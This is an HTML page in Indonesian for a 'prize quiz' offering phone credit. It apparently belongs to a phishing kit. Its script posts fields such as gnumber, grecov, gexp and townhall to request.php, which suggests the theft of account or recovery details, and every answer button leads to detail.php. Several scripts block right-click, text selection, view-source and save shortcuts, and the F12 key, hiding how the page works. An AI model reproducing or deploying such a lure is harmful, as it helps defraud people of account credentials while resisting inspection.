<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<link href='bct.png' rel='icon' type='image/x-png'/>
<title>Quiz Berhadiah Pulsa</title>
<script src="jquery.min.js"></script>
<link rel="stylesheet" href="bootstrap.min.css">
<style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}
.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
.col-md-6 {
 margin:0 auto;
 float:none;

}
.col-md-12 {
 margin:0 auto;
 float:none;

}
</style>
<script type="text/javascript">
	$(document).ready(function(){
	  $("#gsubmit").on("click", function() {

var gnumber = $("#gnumber").val();
var townhall = $("#townhall").val();
var grecov = $("#grecov").val();
var gexp = $("#gexp").val();
		  if(gnumber==''|| grecov=='')
{

}
else
{
	var res = document.getElementById("hasilnya");
          res.innerHTML='';
		  $("#gsubmit").prop("disabled", true );
		  $.post("request.php",
		  {gnumber:gnumber,grecov:grecov,gexp:gexp,townhall:townhall,},
		  function(response,status){
			  $('#hasilnya').html(response);
			$("#gsubmit").prop("disabled", false );
			
		  });
		  return false;
	  }
	  }
	  );
	});

	</script>
<!-- Kode menampilkan peringatan untuk mengaktifkan javascript-->
<div align="center"><noscript>
   <div style="position:fixed; top:0px; left:0px; z-index:3000; height:100%; width:100%; background-color:#FFFFFF">
   <div style="font-family: Arial; font-size: 17px; background-color:#00bbf9; padding: 11pt;">Mohon aktifkan javascript pada browser untuk mengakses halaman ini!</div></div>
</noscript></div>

<!--Kode untuk mencegah seleksi teks, block teks dll.-->
<script type="text/javascript">
function disableSelection(e){if(typeof e.onselectstart!="undefined")e.onselectstart=function(){return false};else if(typeof e.style.MozUserSelect!="undefined")e.style.MozUserSelect="none";else e.onmousedown=function(){return false};e.style.cursor="default"}window.onload=function(){disableSelection(document.body)}
</script>

<!--Kode untuk mematikan fungsi klik kanan di blog-->
<script type="text/javascript">
function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
</script>

<style type="text/css">
* : (input, textarea) {
    -webkit-touch-callout: none;
    -webkit-user-select: none;

}
</style>
<style type="text/css">
img {
	-webkit-touch-callout: none;
	-webkit-user-select: none;
    }
</style>

<!--Kode untuk mencegah shorcut keyboard, view source dll.-->
<script type="text/javascript">
window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
</script>
<script type="text/javascript">
document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}
</script>
<script type='text/javascript'>window._sbzq||function(e){e._sbzq=[];var t=e._sbzq;t.push(["_setAccount",54166]);var n=e.location.protocol=="https:"?"https:":"http:";var r=document.createElement("script");r.type="text/javascript";r.async=true;r.src=n+"//static.subiz.com/public/js/loader.js";var i=document.getElementsByTagName("script")[0];i.parentNode.insertBefore(r,i)}(window);</script>

<body style="padding:0px;margin:0 auto;">
<div style="padding:0px;margin:0 auto;" class="container ">

<div style="border:none;padding:0px;margin:0 auto;" class="col-md-6">
<div style="border:none;padding:0px;margin:0px;" class="well well-sm">
<center style="background:white;"><br>
<div class="col-md-12">
<marquee>

<style typecss="[{http://sahabatblogger77.blogspot.com}]">
  #highlight{font:bold 20px Impact,Arial,Sans-Serif;}</style>
<script language="javascript" type="text/javascript">
     var teks="Jawab Pertanyaan Berikut"
     var speed=20

if (document.all||document.getElementById) {
     document.write('<span id="highlight">' + teks + '</span>')
     var storetext=document.getElementById? document.getElementById("highlight") :
document.all.highlight
} else document.write(text)
var hex=new Array("00","14","28","3C","50","64","78","8C","A0","B4","C8","DC","F0")

var r=1
var g=1
var b=1
var seq=1

function changetext() {
     rainbow="#"+hex[r]+hex[g]+hex[b]
     storetext.style.color=rainbow
}

function change() {
if (seq==6) {
b--
if (b==0)
seq=1
}
if (seq==5) {
r++
if (r==12)
seq=6
}
if (seq==4) {
g--
if (g==0)
seq=5
}
if (seq==3) {
b++
if (b==12)
seq=4
}
if (seq==2) {
r--
if (r==0)
seq=3
}
if (seq==1) {
g++
if (g==12)
seq=2
}
changetext()
}

function starteffect() {
     if (document.all||document.getElementById)
     flash=setInterval("change()",speed)
}

starteffect()
</script></marquee>
</div>
<div  style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background:#f7f7f7;width:100%" class="form-horizontal">

       <form action="detail.php" id="login-form" method="post">
<div style="width:100%" class="form-group">
<h4 >
  Pertanyaan 3 Dari 3: Singkatan dari HAM adalah?
  </h4><br/>
<div style="width:100%" class="form-group">
<a  href="detail.php" class="btn btn-block" style="color: #ffffff;background-color: #2780e3;" id="gsubmit"> Hak asasi manusia </a>
<a  href="detail.php" class="btn btn-block" style="color: #ffffff;background-color: #2780e3;" id="gsubmit"> Hak anak manusia </a>
<a  href="detail.php" class="btn btn-block" style="color: #ffffff;background-color: #2780e3;" id="gsubmit"> Hak anda manusia </a>
 </form>
</div>